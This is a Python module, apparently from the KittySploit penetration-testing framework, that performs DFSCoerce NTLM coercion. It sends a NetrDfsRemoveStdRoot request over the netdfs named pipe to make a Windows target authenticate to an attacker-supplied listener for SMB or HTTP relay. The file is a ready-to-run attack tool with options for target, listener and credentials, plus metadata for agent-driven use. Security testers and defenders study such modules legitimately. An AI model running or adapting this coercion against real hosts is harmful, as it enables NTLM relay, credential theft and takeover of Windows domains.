#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DFSCoerce NTLM coercion via NetrDfsRemoveStdRoot (MS-DFSNM)."""

from kittysploit import *
from lib.protocols.samr.coerce.dfscoerce import dfscoerce_coerce


class Module(Auxiliary):
    __info__ = {
        'name': 'DFSCoerce NTLM Coercion',
        'description': (
            'Coerces a Windows target to authenticate to an attacker listener via '
            'NetrDfsRemoveStdRoot over the netdfs named pipe (DFSCoerce). '
            'Use with SMB/HTTP relay listeners.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2022-26725'],
        'references': ['https://github.com/p0dalirius/Coercer'],
        'tags': ['smb', 'coerce', 'dfscoerce', 'ntlm', 'relay', 'ad'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['credential_coercion'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'chain': {
                'produces_capabilities': [{'capability': 'ntlm_coerce', 'from_detail': 'netdfs'}],
            },
        },
    }

    target = OptString('', 'Coerce target IP or hostname', required=True)
    listener_ip = OptString('', 'Attacker listener IP', required=True)
    username = OptString('', 'SMB username (optional)', required=False)
    password = OptString('', 'SMB password (optional)', required=False)
    domain = OptString('', 'AD domain', required=False)
    dc_ip = OptString('', 'Domain controller IP (defaults to target)', required=False)

    def check(self):
        return bool(str(self.target or '').strip() and str(self.listener_ip or '').strip())

    def run(self):
        target = str(self.target or self.rhost or '').strip()
        listener = str(self.listener_ip or '').strip()
        if not target or not listener:
            print_error('Set target and listener_ip')
            return False
        user = str(self.username or '').strip() or 'guest'
        pwd = str(self.password or '').strip() or ''
        dom = str(self.domain or '').strip() or 'WORKGROUP'
        dc = str(self.dc_ip or '').strip() or target
        print_status(f'DFSCoerce: {target} → \\\\{listener}\\test')
        try:
            dfscoerce_coerce(username=user, password=pwd, domain=dom, dc_ip=dc, listener=listener, target=target)
            print_success('Coerce request sent — check relay listener')
            return True
        except Exception as exc:
            print_error(f'Coerce failed: {exc}')
            return False
